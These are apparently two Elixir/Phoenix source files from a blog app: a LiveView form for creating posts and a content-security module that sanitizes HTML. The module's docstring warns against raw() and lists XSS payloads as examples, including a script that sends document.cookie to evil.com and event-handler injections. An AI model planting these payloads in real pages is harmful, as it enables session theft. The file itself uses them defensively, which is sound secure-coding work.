# lib/blog_web/live/post_live/form.ex
defmodule BlogWeb.PostLive.Form do
  use BlogWeb, :live_view

  alias Blog.Posts
  alias Blog.Posts.Post

  @impl true
  def mount(_params, _session, socket) do
    changeset = Posts.change_post(%Post{})
    {:ok, assign(socket, form: to_form(changeset))}
  end

  @impl true
  def handle_event("validate", %{"post" => post_params}, socket) do
    changeset =
      %Post{}
      |> Posts.change_post(post_params)
      |> Map.put(:action, :validate)

    {:noreply, assign(socket, form: to_form(changeset))}
  end

  @impl true
  def handle_event("save", %{"post" => post_params}, socket) do
    case Posts.create_post(socket.assigns.current_user, post_params) do
      {:ok, post} ->
        {:noreply,
         socket
         |> put_flash(:info, "Post created successfully!")
         |> push_navigate(to: ~p"/posts/#{post.id}")}

      {:error, changeset} ->
        {:noreply, assign(socket, form: to_form(changeset))}
    end
  end

  @impl true
  def render(assigns) do
    ~H"""
    <div class="max-w-4xl mx-auto py-8">
      <h1 class="text-3xl font-bold mb-8">New Post</h1>

      <.form for={@form} phx-change="validate" phx-submit="save" class="space-y-6">
        <div>
          <.input field={@form[:title]} label="Title" type="text" required />
        </div>

        <div>
          <label class="block text-sm font-semibold mb-2">
            Content (HTML formatting allowed)
          </label>
          <textarea
            name={@form[:content].name}
            id={@form[:content].id}
            rows="15"
            class="w-full border rounded-lg p-3 font-mono text-sm"
            placeholder="Write your post with HTML formatting: <p>, <strong>, <em>, <h2>, <ul>, <li>, <a href='...'>, <img src='...'>, <blockquote>, <code>, <pre>"
          ><%= Phoenix.HTML.Form.normalize_value("textarea", @form[:content].value) %></textarea>
          <p class="text-sm text-gray-500 mt-1">
            Allowed tags: p, strong, em, headings, lists, links, images, blockquotes, code blocks, tables.
            Scripts and event handlers are automatically removed for security.
          </p>
        </div>

        <div>
          <button type="submit" class="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700">
            Publish Post
          </button>
        </div>
      </.form>
    </div>
    """
  end
end

# lib/blog/content_security.ex
defmodule Blog.ContentSecurity do
  @moduledoc """
  Content security utilities. Documents why raw() must never be used
  with user-generated content and provides safe alternatives.

  ## DANGER - Never do this:

      <%= raw @post.content %>
      <%= raw user_input %>
      <%= Phoenix.HTML.raw(params["content"]) %>

  ## SAFE alternatives:

      <%= safe_html(@post.sanitized_content) %>
      <%= HtmlSanitizeEx.basic_html(content) |> Phoenix.HTML.raw() %>

  ## Attack examples that raw() would allow:

      <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
      <img src=x onerror="alert(document.domain)">
      <a href="javascript:alert('XSS')">Click me</a>
      <div onmouseover="malicious()">Hover here</div>
  """

  @doc "Sanitize and return safe HTML for rendering"
  def sanitize(nil), do: ""
  def sanitize(html) when is_binary(html) do
    HtmlSanitizeEx.basic_html(html)
  end
end